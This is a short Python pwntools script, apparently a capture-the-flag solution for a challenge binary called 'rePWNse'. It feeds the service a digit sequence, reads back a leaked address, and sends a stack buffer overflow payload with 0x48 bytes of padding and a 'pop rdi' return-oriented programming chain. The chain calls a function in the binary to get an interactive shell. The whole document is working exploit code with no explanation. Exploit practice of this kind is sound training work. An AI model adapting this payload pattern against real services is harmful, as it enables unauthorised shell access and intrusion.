from pwn import *

p=remote("0",44853)
#p=process("./rePWNse")
action=0x0000000000401296
pop_rdi=0x000000000040168E
p.sendlineafter("Input seven single digits:",b'1')
sleep(0.1)
p.sendline(b'9')
sleep(0.1)
p.sendline(b'1')
sleep(0.1)
p.sendline(b'9')
sleep(0.1)
p.sendline(b'8')
sleep(0.1)
p.sendline(b'1')
sleep(0.1)
p.sendline(b'0')
p.recvline()
p.recvline()
addr=p.recvline()[-9:-1]
sh_addr=int(addr,16)
print(hex(sh_addr))
payload=b'a'*0x48+p64(pop_rdi)+p64(sh_addr)+p64(action)
p.sendlineafter("What do you want?",payload)
p.interactive()
